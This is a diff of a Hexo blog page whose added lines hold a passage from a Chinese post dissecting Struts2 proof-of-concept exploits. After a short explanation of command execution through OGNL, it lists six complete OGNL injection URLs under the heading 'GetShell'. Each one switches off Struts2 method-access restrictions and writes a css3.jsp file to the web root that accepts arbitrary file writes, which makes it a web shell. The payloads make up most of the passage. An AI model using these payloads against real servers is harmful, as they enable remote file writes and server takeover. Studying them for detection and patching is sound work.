+<p>就可以执行任意命令了。Exec执行后返回的类型是java.lang.Process。Process是一个抽象类，final class ProcessImpl extends Process也是Process的具体实现。而命令执行后返回的Process可以通过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">public OutputStream getOutputStream()</div><div class="line">public InputStream getInputStream()</div></pre></td></tr></table></figure></p>
+<p>直接输入输出流，拿到InputStream之后直接读取就能够获取到命令执行的结果了。而在Ognl里面不能够用正常的方式去读取流，而多是用DataInputStream的readFully或BufferedReader的read方法全部读取或者按byte读取的。因为可能会读取到半个中文字符，所以可能会存在乱码问题，自定义每次要读取的大小就可以了。POC当中的/c 不是必须的，执行dir之类的命令可以加上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Process java.lang.Runtime.exec(String <span class="built_in">command</span>) throws IOException</div></pre></td></tr></table></figure></p>
+<p>#####GetShell<br>poc1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\u0023_memberAccess[\'</span>allowStaticMethodAccess\<span class="string">']'</span>)(meh)=<span class="literal">true</span>&amp;(aaa)((<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003d\u0023foo'</span>)(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&amp;(i1)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(i12)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i13)((<span class="string">'\43xman.getWriter().println(\43req.getServletContext().getRealPath(%22\u005c%22))'</span>)(d))&amp;(i2)((<span class="string">'\43fos\75new\40java.io.FileOutputStream(new\40java.lang.StringBuilder(\43req.getRealPath(%22\u005c%22)).append(@java.io.File@separator).append(%22css3.jsp%22).toString())'</span>)(d))&amp;(i3)((<span class="string">'\43fos.write(\43req.getParameter(%22p%22).getBytes())'</span>)(d))&amp;(i4)((<span class="string">'\43fos.close()'</span>)(d))&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
+<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())%2b'</span>%20&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
+<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
+<p>poc4:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
+<p>poc5:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()&#125;</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
+<p>poc6:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()&#125;</span>&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
+<p>比如POC4当中首先就是把allowStaticMethodAccess改为trute即允许静态方法访问。然后再获取请求对象，从请求对象中获取网站项目的根路径，然后在根目录下新建一个css3.jsp，而css3.jsp的内容同样来自于客户端的请求。POC4中的p就是传入的参数，只要获取p就能获取到内容完成文件的写入了。之前已经说过Java不是动态的脚本语言，所以没有eval。不能像PHP那样直接用eval去动态执行，所以Java里面没有真正意义上的一句话木马。菜刀只是提供了一些常用的一句话的功能的具体的实现，所以菜刀的代码会很长，因为这些代码在有eval的情况下是可以通过发送请求的形式去构造的，在这里就必须把代码给上传到服务器去编译成执行。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2017/07/18/解密Struts2-POC/" data-id="cjca1zrwx000y881bfa8ebhkp" class="article-share-link">Share</a>
       
       
     </footer>
@@ -828,7 +647,7 @@
 
 
   <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
   </nav>
 </section>
         
@@ -846,7 +665,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
     </div>
   </div>
 
@@ -854,28 +673,28 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Articles récents</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
         
           <li>
-            <a href="/2018/01/05/浏览器工作原理/">浏览器工作原理</a>
+            <a href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/">利用java反序列化漏洞植入门罗币挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/10/powershell植入mule挖矿程序事件分析/">powershell植入mule挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/">利用s2-045植入门罗币挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/09/s2-045入侵事件分析/">s2-045入侵事件分析</a>
           </li>
         
           <li>
             <a href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
-          </li>
-        
-          <li>
-            <a href="/2018/01/02/机器学习之安全数据集/">机器学习之安全数据集</a>
-          </li>
-        
-          <li>
-            <a href="/2017/12/27/大型互联网企业入侵检测实战总结/">大型互联网企业入侵检测实战总结</a>
-          </li>
-        
-          <li>
-            <a href="/2017/11/27/Shodan-快速入门/">Shodan 快速入门</a>
           </li>
         
       </ul>
@@ -892,7 +711,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2018 SY0U<br>
-      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
